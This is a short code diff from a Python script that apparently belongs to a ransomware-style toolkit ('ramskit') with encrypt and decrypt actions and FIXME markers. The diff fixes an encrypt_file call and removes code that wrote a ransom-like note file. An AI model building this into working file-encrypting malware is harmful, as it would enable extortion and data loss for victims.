@@ -47,13 +47,9 @@ def main() -> None:
             print("[x] Please provide the path to the file using the -p or --path option. Exiting...")
             sys.exit(1)
 
-        ramskit.encrypt_file(encrypted, key)
+        ramskit.encrypt_file([encrypted], key)
         print("[x] File encrypted. Exiting...")
 
-        with open(os.path.join(path_encrypted, 'look_at_me.txt'), 'w') as file:
-            ramskit.encrypt_file(full_path_encrypted, key)
-            file.write("Yo, this file has been encrypted")
-            file.close()
 
     elif action == 'decrypt':
         # FIXME 4: Check and fix key
